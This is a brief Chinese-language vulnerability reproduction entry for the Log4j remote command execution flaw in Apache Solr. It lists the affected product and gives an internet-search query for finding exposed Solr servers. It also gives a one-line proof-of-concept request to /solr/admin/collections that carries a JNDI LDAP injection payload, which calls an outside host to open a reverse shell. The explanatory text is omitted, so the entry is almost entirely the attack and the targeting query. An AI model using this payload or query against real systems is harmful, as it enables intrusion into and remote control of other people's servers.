# Apache Solr Log4j 组件 远程命令执行漏洞 

## 漏洞描述

Apache Solr Log4j 组件 远程命令执行漏洞，详情略

## 漏洞影响

```
Apache Solr
```

## 网络测绘

```
app="APACHE-Solr"
```

## 漏洞复现

登录页面

![](images/202205251622273.png)

验证 POC

```
/solr/admin/collections?action=${jndi:ldap://xxx/Basic/ReverseShell/ip/87}&wt=json
```

![](images/202205251622876.png)
